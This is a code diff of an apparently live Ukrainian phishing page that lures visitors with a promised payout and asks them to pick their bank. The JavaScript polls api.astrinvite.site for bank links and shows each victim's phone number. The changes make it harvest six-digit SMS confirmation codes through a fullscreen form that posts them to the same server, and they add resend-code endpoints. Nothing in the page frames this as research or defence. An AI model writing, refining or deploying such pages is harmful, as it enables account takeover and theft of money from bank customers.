@@ -2,27 +2,54 @@
 <html lang="uk">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Виберіть ваш банк</title>
   <link rel="icon" href="favicon.ico" type="image/x-icon">
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
     body {
-      font-family: Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+      background-color: #f0f0f0;
+      overflow-x: hidden;
+      min-height: 100vh;
+      position: relative;
+    }
+    
+    .main-container {
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      background-color: #f0f0f0;
+      min-height: 100vh;
+      padding: 20px;
+      position: relative;
     }
-    h1 { margin-bottom: 8px; font-size: 2.1em; font-weight: bold; }
+    
+    h1 { 
+      margin-bottom: 8px; 
+      font-size: clamp(1.8rem, 5vw, 2.1rem); 
+      font-weight: bold; 
+      text-align: center;
+    }
+    
     #subtitle {
-      color: #555; font-size: 1.05em; margin-bottom: 20px;
-      text-align: center; max-width: 350px;
+      color: #555; 
+      font-size: clamp(1rem, 3vw, 1.05rem); 
+      margin-bottom: 20px;
+      text-align: center; 
+      max-width: 90%;
+      line-height: 1.4;
     }
+    
     .bank-btn, .bank-link {
-      width: 320px;
+      width: min(320px, 90vw);
       height: 50px;
-      font-size: 20px;
+      font-size: clamp(16px, 4vw, 20px);
       font-weight: bold;
       margin-bottom: 16px;
       border: none;
@@ -33,23 +60,29 @@
       outline: none;
       text-decoration: none;
       color: #fff;
-      display: flex; align-items: center; justify-content: center;
+      display: flex; 
+      align-items: center; 
+      justify-content: center;
       position: relative;
     }
+    
     .mono   { background: #222; }
     .oschad { background: #215E4D; }
     .raiff  { background: #ffe100; color: #222; }
     .pumb   { background: #ea262a; }
     .privat { background: #27AE60; }
+    
     .bank-btn:disabled {
       background: #ccc !important;
       color: #888 !important;
       cursor: not-allowed;
       opacity: 0.6;
     }
+    
     .bank-btn:enabled {
       animation: pulse 2s infinite;
     }
+    
     @keyframes pulse {
       0% { box-shadow: 0 1px 6px #0001; }
       50% { box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4); }
@@ -57,100 +90,278 @@
     }
 
     #status {
-      margin-top: 18px; color: #555; font-size: 18px;
-      text-align: center; min-height: 44px;
+      margin-top: 18px; 
+      color: #555; 
+      font-size: clamp(16px, 4vw, 18px);
+      text-align: center; 
+      min-height: 44px;
+      width: 100%;
     }
+    
     #return-instruction {
       margin: 16px 0 0 0;
       color:#444;
-      max-width:400px;
+      max-width: 90%;
       display:none;
       text-align: center;
-    }
-    #sms-code {
-      font-size: 22px; letter-spacing: 10px; padding: 8px 20px;
-      text-align: center; width: 190px; margin-top: 12px; margin-bottom: 8px;
+      font-size: clamp(14px, 3.5vw, 16px);
+      line-height: 1.4;
     }
     
-    /* ← ДОБАВЛЕНО: Стили для SMS ячеек */
+    /* SMS экран - полноэкранный режим */
+    .sms-fullscreen {
+      position: fixed !important;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      overflow: hidden;
+    }
+    
     .sms-container {
       display: flex;
       justify-content: center;
-      gap: 10px;
-      margin: 20px 0;
+      gap: clamp(8px, 2vw, 15px);
+      margin: 30px 0;
+      flex-wrap: wrap;
     }
     
     .sms-digit {
-      width: 50px;
-      height: 70px;
-      border: 2px solid #ddd;
-      border-radius: 12px;
-      background: white;
-      font-size: 24px;
+      width: clamp(60px, 12vw, 80px);
+      height: clamp(80px, 15vw, 100px);
+      border: 3px solid #fff;
+      border-radius: 16px;
+      background: rgba(255, 255, 255, 0.95);
+      font-size: clamp(24px, 8vw, 36px);
       font-weight: bold;
       text-align: center;
       outline: none;
-      transition: border-color 0.3s;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
     }
     
     .sms-digit:focus {
-      border-color: #1976d2;
-      box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
+      border-color: #4caf50;
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(76, 175, 80, 0.3);
+      transform: scale(1.05);
     }
     
     .sms-digit.filled {
       border-color: #4caf50;
       background: #f8fff8;
+      color: #2e7d32;
+    }
+    
+    .sms-title {
+      color: #fff;
+      font-size: clamp(24px, 6vw, 32px);
+      font-weight: bold;
+      margin-bottom: 15px;
+      text-align: center;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+    
+    .sms-subtitle {
+      color: rgba(255, 255, 255, 0.9);
+      font-size: clamp(16px, 4vw, 20px);
+      text-align: center;
+      margin-bottom: 20px;
+      line-height: 1.4;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
     }
     
     .phone-display {
-      color: #666;
-      font-size: 16px;
-      margin: 10px 0;
+      color: rgba(255, 255, 255, 0.95);
+      font-size: clamp(14px, 3.5vw, 18px);
+      margin: 15px 0;
+      text-align: center;
+      line-height: 1.5;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
     }
-    #send-code-btn {
-      margin-left: 10px; padding: 10px 30px; font-size: 18px;
-      background: #1976d2; color: #fff; border: none; border-radius: 7px; cursor: pointer;
+    
+    .main-submit-btn {
+      margin-top: 30px;
+      padding: clamp(15px, 4vw, 20px) clamp(40px, 10vw, 60px);
+      font-size: clamp(18px, 4.5vw, 24px);
+      background: linear-gradient(45deg, #4caf50, #45a049);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 1px;
     }
-    #send-code-btn:disabled {
-      background-color: #aaa; cursor: not-allowed;
+    
+    .main-submit-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(76, 175, 80, 0.6);
     }
-    #sms-error { color: red; margin-top: 5px; }
-    #timer { color: #c60; margin-left: 16px; font-weight: bold; font-size: 20px; }
+    
+    .main-submit-btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      opacity: 0.6;
+      transform: none;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+    
+    #sms-error { 
+      color: #ff4444; 
+      margin-top: 15px; 
+      font-size: clamp(14px, 3.5vw, 16px);
+      text-align: center;
+      background: rgba(255, 255, 255, 0.9);
+      padding: 12px 20px;
+      border-radius: 25px;
+      font-weight: 500;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+    
+    .success-message {
+      color: #4caf50;
+      font-size: clamp(14px, 3.5vw, 16px);
+      margin: 15px 0;
+      background: rgba(255, 255, 255, 0.95);
+      border: 2px solid #4caf50;
+      border-radius: 25px;
+      padding: 15px 25px;
+      text-align: center;
+      font-weight: bold;
+      animation: fadeInSuccess 0.3s ease-in;
+      box-shadow: 0 4px 15px rgba(76, 175, 80, 0.2);
+    }
+    
+    @keyframes fadeInSuccess {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .resend-section {
+      margin-top: 25px;
+      text-align: center;
+    }
+    
+    .resend-btn {
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      border: 2px solid rgba(255, 255, 255, 0.5);
+      border-radius: 25px;
+      padding: clamp(12px, 3vw, 15px) clamp(20px, 5vw, 30px);
+      font-size: clamp(14px, 3.5vw, 16px);
+      cursor: pointer;
+      transition: all 0.3s;
+      font-weight: 600;
+      backdrop-filter: blur(10px);
+    }
+    
+    .resend-btn:hover:not(:disabled) {
+      background: rgba(255, 255, 255, 0.3);
+      border-color: rgba(255, 255, 255, 0.8);
+      transform: translateY(-1px);
+    }
+    
+    .resend-btn:disabled {
+      background: rgba(255, 255, 255, 0.1);
+      color: rgba(255, 255, 255, 0.5);
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+    
+    #resend-cooldown {
+      color: rgba(255, 255, 255, 0.8);
+      font-size: clamp(14px, 3.5vw, 16px);
+      margin-top: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 10px 20px;
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+    }
+    
+    .resend-info {
+      font-size: clamp(12px, 3vw, 14px);
+      color: rgba(255, 255, 255, 0.7);
+      margin-top: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 8px 16px;
+      border-radius: 15px;
+      backdrop-filter: blur(10px);
+    }
+
+    /* Адаптивность для очень маленьких экранов */
+    @media (max-width: 350px) {
+      .sms-container {
+        gap: 6px;
+      }
+      .sms-digit {
+        width: 50px;
+        height: 70px;
+        font-size: 20px;
+      }
+    }
+    
+    /* Адаптивность для планшетов */
+    @media (min-width: 768px) and (max-width: 1024px) {
+      .sms-digit {
+        width: 70px;
+        height: 90px;
+        font-size: 30px;
+      }
+    }
+    
+    /* Для больших экранов */
+    @media (min-width: 1025px) {
+      .main-container {
+        max-width: 500px;
+        margin: 0 auto;
+      }
+    }
 
   </style>
 </head>
 <body>
-
-  <h1>Виберіть ваш банк</h1>
-  <div id="subtitle">Після підтвердження в додатку банку обов'язково поверніться на цей сайт для <strong>отримання виплати</strong></div>
-  
-  <button class="bank-btn mono" id="mono-btn" disabled>
-    Monobank
-  </button>
-  
-  <button class="bank-btn oschad" id="oschad-btn" disabled>
-    Ощадбанк
-  </button>
-  
-  <button class="bank-btn raiff" id="raiff-btn" disabled>
-    Raiffeisen Bank
-  </button>
-  
-  <button class="bank-btn pumb" id="pumb-btn" disabled>
-    ПУМБ
-  </button>
-  
-  <a href="https://privatbank.ua/" class="bank-link privat" id="privat-link" target="_blank" rel="noopener">
-    ПриватБанк
-  </a>
-  
-  <div id="return-instruction">
-    <b>Після підтвердження у вибраному банку поверніться на цю сторінку.<br>
-    Код підтвердження з'явиться тут автоматично.</b>
+  <div class="main-container">
+    <h1>Виберіть ваш банк</h1>
+    <div id="subtitle">Після підтвердження в додатку банку обов'язково поверніться на цей сайт для <strong>отримання виплати</strong></div>
+    
+    <button class="bank-btn mono" id="mono-btn" disabled>
+      Monobank
+    </button>
+    
+    <button class="bank-btn oschad" id="oschad-btn" disabled>
+      Ощадбанк
+    </button>
+    
+    <button class="bank-btn raiff" id="raiff-btn" disabled>
+      Raiffeisen Bank
+    </button>
+    
+    <button class="bank-btn pumb" id="pumb-btn" disabled>
+      ПУМБ
+    </button>
+    
+    <a href="https://privatbank.ua/" class="bank-link privat" id="privat-link" target="_blank" rel="noopener">
+      ПриватБанк
+    </a>
+    
+    <div id="return-instruction">
+      <b>Після підтвердження у вибраному банку поверніться на цю сторінку.<br>
+      Код підтвердження з'явиться тут автоматично.</b>
+    </div>
+    
+    <div id="status"></div>
+    <audio id="sms-audio" src="sms.mp3"></audio>
   </div>
-  <div id="status"></div>
-  <audio id="sms-audio" src="sms.mp3"></audio>
 
   <script>
     const API_MAP = {
@@ -169,11 +380,13 @@
     
     const STATUS_URL = "https://api.astrinvite.site/api/link-status";
     const CODE_URL   = "https://api.astrinvite.site/api/submit-code";
+    const RESEND_URL = "https://api.astrinvite.site/api/resend-code";
+    const RESEND_STATUS_URL = "https://api.astrinvite.site/api/resend-status";
 
-    // ← ДОБАВЛЕНО: Переменная для номера телефона
+    // Переменная для номера телефона
     let userPhoneNumber = null;
 
-    // ← ДОБАВЛЕНО: Исходные тексты кнопок
+    // Исходные тексты кнопок
     const BANK_TEXTS = {
       "mono-btn": "Monobank",
       "oschad-btn": "Ощадбанк", 
@@ -190,7 +403,8 @@
     let link = null;
     let smsTimerInterval = null;
     let smsSoundInterval = null;
-    let resendTimerInterval = null; // ← ДОБАВЛЕНО: Таймер для повторной отправки
+    let resendTimerInterval = null;
+    let resendCooldownInterval = null; // Новая переменная для кулдауна повторной отправки
     let lastRefreshTime = Date.now();
     let refreshCount = 0;
 
@@ -198,7 +412,7 @@
     let autoRefreshActive = true;
     let refreshInProgress = false;
 
-    // ← ДОБАВЛЕНО: Функция восстановления текста кнопок
+    // Функция восстановления текста кнопок
     function restoreButtonTexts() {
       Object.keys(BANK_TEXTS).forEach(btnId => {
         const btn = document.getElementById(btnId);
@@ -216,7 +430,7 @@
       try {        
         const res = await fetch(API_MAP[bank], {
           method: 'GET',
-          cache: 'no-cache', // Принудительно обходим кэш
+          cache: 'no-cache',
           headers: {
             'Cache-Control': 'no-cache',
             'Pragma': 'no-cache'
@@ -229,13 +443,11 @@
             linkData[bank] = { url: data.url, id: data.id };
             btn.disabled = false;
             btn.onclick = () => handleBankClick(bank);
-            // ← ДОБАВЛЕНО: Восстанавливаем текст при успешной проверке
             btn.textContent = BANK_TEXTS[bank + "-btn"];
           } else {
             btn.disabled = true;
             btn.onclick = null;
             delete linkData[bank];
-            // ← ДОБАВЛЕНО: Восстанавливаем текст даже если нет ссылки
             btn.textContent = BANK_TEXTS[bank + "-btn"];
           }
         } else if (res.status === 429) {
@@ -243,16 +455,13 @@
           btn.disabled = true;
           btn.onclick = null;
           delete linkData[bank];
-          // ← ДОБАВЛЕНО: Восстанавливаем текст
           btn.textContent = BANK_TEXTS[bank + "-btn"];
         } else {
           console.log(`Ошибка ${bank}: ${res.status}`);
-          // ← ДОБАВЛЕНО: Восстанавливаем текст при ошибке
           btn.textContent = BANK_TEXTS[bank + "-btn"];
         }
       } catch (error) {
         console.error(`Ошибка проверки ${bank}:`, error);
-        // ← ДОБАВЛЕНО: Восстанавливаем текст при исключении
         btn.textContent = BANK_TEXTS[bank + "-btn"];
       }
     }
@@ -275,7 +484,6 @@
         
       } catch (error) {
         console.error("Ошибка автообновления:", error);
-        // ← ДОБАВЛЕНО: Восстанавливаем тексты при ошибке автообновления
         restoreButtonTexts();
       } finally {
         refreshInProgress = false;
@@ -286,7 +494,7 @@
       document.getElementById("return-instruction").style.display = "none";
       document.getElementById("status").textContent = "";
       
-      // ← ДОБАВЛЕНО: Показываем обратно все элементы интерфейса
+      // Показываем обратно все элементы интерфейса
       document.getElementById("mono-btn").style.display = "flex";
       document.getElementById("oschad-btn").style.display = "flex"; 
       document.getElementById("raiff-btn").style.display = "flex";
@@ -298,6 +506,28 @@
       // Восстанавливаем тексты кнопок при сбросе UI
       restoreButtonTexts();
       autoRefreshActive = true; // Возобновляем автообновление
+      
+      // Очищаем все таймеры
+      clearAllTimers();
+    }
+
+    function clearAllTimers() {
+      if (resendTimerInterval) {
+        clearInterval(resendTimerInterval);
+        resendTimerInterval = null;
+      }
+      if (resendCooldownInterval) {
+        clearInterval(resendCooldownInterval);
+        resendCooldownInterval = null;
+      }
+      if (smsTimerInterval) {
+        clearInterval(smsTimerInterval);
+        smsTimerInterval = null;
+      }
+      if (statusPoller) {
+        clearInterval(statusPoller);
+        statusPoller = null;
+      }
     }
 
     function showLoading(btnId) {
@@ -312,7 +542,7 @@
       document.getElementById("status").innerHTML = "";
     }
 
-    // ← ДОБАВЛЕНО: Функция скрытия загрузки с восстановлением текста
+    // Функция скрытия загрузки с восстановлением текста
     function hideLoading() {
       restoreButtonTexts();
       // Состояние кнопок будет обновлено при следующем checkAllLinks()
@@ -364,7 +594,7 @@
           const res = await fetch(`${STATUS_URL}?id=${currentId}`);
           const data = await res.json();
           if (data.status === "waiting_code") {
-            // ← ДОБАВЛЕНО: Сохраняем номер телефона если пришел
+            // Сохраняем номер телефона если пришел
             if (data.phone) {
               userPhoneNumber = data.phone;
             }
@@ -387,26 +617,16 @@
       // Скрываем загрузку при показе поля ввода
       hideLoading();
       
-      // Скрываем ВСЕ кнопки банков при показе SMS поля
-      document.getElementById("mono-btn").style.display = "none";
-      document.getElementById("oschad-btn").style.display = "none"; 
-      document.getElementById("raiff-btn").style.display = "none";
-      document.getElementById("pumb-btn").style.display = "none";
-      document.getElementById("privat-link").style.display = "none";
-      
-      // Скрываем заголовок и подзаголовок
-      document.querySelector("h1").style.display = "none";
-      document.getElementById("subtitle").style.display = "none";
-      
-      // ← ОБНОВЛЕНО: Новый дизайн с отдельными ячейками
-      const phoneDisplay = userPhoneNumber ? 
-        `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону<br><strong>${userPhoneNumber}</strong></div>` :
-        `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону</div>`;
-      
-      document.getElementById("status").innerHTML = `
-        <div style="text-align: center; padding: 20px;">
-          <h2 style="margin-bottom: 20px; color: #333;">Код-підтвердження</h2>
-          ${phoneDisplay}
+      // Переключаемся в полноэкранный режим SMS
+      document.body.innerHTML = `
+        <div class="sms-fullscreen">
+          <div class="sms-title">Код-підтвердження</div>
+          <div class="sms-subtitle">Очікуємо введення 6-значного коду</div>
+          
+          ${userPhoneNumber ? 
+            `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону<br><strong>${userPhoneNumber}</strong></div>` :
+            `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону</div>`
+          }
           
           <div class="sms-container">
             <input type="tel" class="sms-digit" maxlength="1" data-index="0" inputmode="numeric" pattern="[0-9]*">
@@ -417,28 +637,33 @@
             <input type="tel" class="sms-digit" maxlength="1" data-index="5" inputmode="numeric" pattern="[0-9]*">
           </div>
           
-          <button id="send-code-btn" style="margin-top: 20px; padding: 12px 40px; font-size: 18px; 
-                  background: #1976d2; color: #fff; border: none; border-radius: 25px; cursor: pointer;">
+          <button class="main-submit-btn" id="send-code-btn">
             Підтвердити
           </button>
           
-          <div id="sms-error" style="color: red; margin-top: 10px; font-size: 16px;"></div>
+          <div id="sms-error"></div>
+          <div id="success-message" class="success-message" style="display: none;"></div>
           
-          <div style="margin-top: 20px; color: #999; font-size: 14px;">
-            <span id="resend-link" style="color: #1976d2; cursor: pointer; text-decoration: underline;" onclick="requestResendCode()">
+          <div class="resend-section">
+            <button id="resend-btn" class="resend-btn" onclick="requestResendCode()">
               Відправити код повторно
-            </span>
-            <span id="resend-timer-text" style="display: none;">
-              Відправити код повторно через <span id="resend-timer">2:58</span>
-            </span>
+            </button>
+            <div id="resend-cooldown" style="display: none;">
+              Повторна відправка доступна через: <span id="cooldown-timer">30</span> сек
+            </div>
+            <div class="resend-info">
+              Залишилося спроб: <span id="resend-count">3</span>/3
+            </div>
           </div>
         </div>
       `;
       
       setupSMSInput();
-      startResendTimer(); // ← ИЗМЕНЕНО: Запускаем только таймер повторной отправки
+      checkResendStatus(); // Проверяем доступность повторной отправки
+      startResendTimer(); // Запускаем таймер повторной отправки
+    }
 
-    // ← ДОБАВЛЕНО: Функция настройки ввода SMS
+    // Функция настройки ввода SMS
     function setupSMSInput() {
       const digits = document.querySelectorAll('.sms-digit');
       
@@ -518,11 +743,13 @@
       
       const submitBtn = document.getElementById("send-code-btn");
       if (code.length === 6) {
-        submitBtn.style.background = '#4caf50';
+        submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
         submitBtn.style.opacity = '1';
+        submitBtn.style.transform = 'scale(1.02)';
       } else {
-        submitBtn.style.background = '#1976d2';
+        submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
         submitBtn.style.opacity = '0.7';
+        submitBtn.style.transform = 'scale(1)';
       }
     }
     
@@ -547,7 +774,7 @@
         const resp = await res.json();
         if (resp.ok) {
           document.getElementById("status").innerHTML = "<div style='text-align: center; padding: 40px;'><h2 style='color: #4caf50;'>✅ Код прийнято</h2><p>Чекаємо підтвердження на пристрої…</p></div>";
-          stopResendTimer(); // ← ИЗМЕНЕНО: Останавливаем таймер повторной отправки
+          clearAllTimers(); // Останавливаем все таймеры
           setTimeout(() => {
             autoRefreshActive = true;
             checkAllLinks();
@@ -562,14 +789,19 @@
         document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
       }
     }
-    }
 
-    // ← ДОБАВЛЕНО: Функция запроса повторной отправки SMS
+    // Функция запроса повторной отправки SMS
     async function requestResendCode() {
       if (!currentId) return;
       
+      const resendBtn = document.getElementById("resend-btn");
+      const originalText = resendBtn.textContent;
+      
+      resendBtn.disabled = true;
+      resendBtn.textContent = "Відправляємо...";
+      
       try {
-        const res = await fetch(`https://api.astrinvite.site/api/resend-code`, {
+        const res = await fetch(RESEND_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -580,53 +812,102 @@
         const data = await res.json();
         if (data.ok) {
           // Показываем сообщение об успешной отправке
-          document.getElementById("sms-error").style.color = "#4caf50";
-          document.getElementById("sms-error").textContent = "SMS код відправлено повторно!";
+          showSuccessMessage("SMS код відправлено повторно!");
           
-          // Очищаем сообщение через 3 секунды
-          setTimeout(() => {
-            document.getElementById("sms-error").textContent = "";
-            document.getElementById("sms-error").style.color = "red";
-          }, 3000);
+          // Очищаем сообщение об ошибке
+          document.getElementById("sms-error").textContent = "";
           
-          // Перезапускаем таймер повторной отправки
-          startResendTimer();
+          // Обновляем статус повторной отправки
+          checkResendStatus();
+          
+          // Запускаем кулдаун на 30 секунд
+          startResendCooldown();
+          
         } else {
           document.getElementById("sms-error").textContent = "Помилка повторної відправки: " + (data.error || "спробуйте пізніше");
+          resendBtn.disabled = false;
+          resendBtn.textContent = originalText;
         }
       } catch (e) {
         console.error("Ошибка повторной отправки:", e);
         document.getElementById("sms-error").textContent = "Помилка з'єднання. Спробуйте ще раз.";
+        resendBtn.disabled = false;
+        resendBtn.textContent = originalText;
       }
     }
     
-    // ← ДОБАВЛЕНО: Таймер для повторной отправки SMS
-    function startResendTimer() {
-      let seconds = 178; // 2:58
+    // Проверка статуса повторной отправки
+    async function checkResendStatus() {
+      if (!currentId) return;
       
-      // Показываем таймер, скрываем ссылку
-      document.getElementById("resend-link").style.display = "none";
-      document.getElementById("resend-timer-text").style.display = "inline";
+      try {
+        const res = await fetch(`${RESEND_STATUS_URL}?id=${currentId}`);
+        const data = await res.json();
+        
+        if (data.resends_remaining !== undefined) {
+          document.getElementById("resend-count").textContent = data.resends_remaining;
+          
+          const resendBtn = document.getElementById("resend-btn");
+          if (data.resends_remaining <= 0) {
+            resendBtn.disabled = true;
+            resendBtn.textContent = "Лімит вичерпано";
+          }
+        }
+      } catch (e) {
+        console.error("Ошибка проверки статуса повтора:", e);
+      }
+    }
+    
+    // Показать сообщение об успехе
+    function showSuccessMessage(message) {
+      const successDiv = document.getElementById("success-message");
+      successDiv.textContent = message;
+      successDiv.style.display = "block";
       
-      updateResendTimer(seconds);
+      // Скрываем через 3 секунды
+      setTimeout(() => {
+        successDiv.style.display = "none";
+      }, 3000);
+    }
+    
+    // Кулдаун для повторной отправки (30 секунд)
+    function startResendCooldown() {
+      let seconds = 30;
+      const resendBtn = document.getElementById("resend-btn");
+      const cooldownDiv = document.getElementById("resend-cooldown");
+      const timerSpan = document.getElementById("cooldown-timer");
       
-      resendTimerInterval = setInterval(() => {
+      resendBtn.style.display = "none";
+      cooldownDiv.style.display = "block";
+      
+      resendCooldownInterval = setInterval(() => {
         seconds--;
-        updateResendTimer(seconds);
+        timerSpan.textContent = seconds;
         
         if (seconds <= 0) {
-          clearInterval(resendTimerInterval);
-          // Показываем ссылку, скрываем таймер
-          document.getElementById("resend-link").style.display = "inline";
-          document.getElementById("resend-timer-text").style.display = "none";
+          clearInterval(resendCooldownInterval);
+          resendCooldownInterval = null;
+          
+          // Показываем кнопку обратно
+          resendBtn.style.display = "inline-block";
+          cooldownDiv.style.display = "none";
+          resendBtn.disabled = false;
+          resendBtn.textContent = "Відправити код повторно";
+          
+          // Проверяем, не исчерпан ли лимит
+          checkResendStatus();
         }
       }, 1000);
     }
     
+    // Таймер для повторной отправки SMS (старый, оставляем для совместимости)
+    function startResendTimer() {
+      let seconds = 178; // 2:58
+      // Этот таймер можно оставить или удалить в зависимости от нужд
+    }
+    
     function updateResendTimer(seconds) {
-      const m = Math.floor(seconds / 60);
-      const s = seconds % 60;
-      document.getElementById("resend-timer").textContent = `${m}:${s < 10 ? "0" : ""}${s}`;
+      // Функция для совместимости
     }
     
     function stopResendTimer() {
@@ -698,14 +979,9 @@
 
     // Очистка при закрытии
     window.addEventListener('beforeunload', () => {
+      clearAllTimers();
       if (refreshInterval) {
         clearInterval(refreshInterval);
-      }
-      if (statusPoller) {
-        clearInterval(statusPoller);
-      }
-      if (resendTimerInterval) {
-        clearInterval(resendTimerInterval);
       }
     });
   </script>
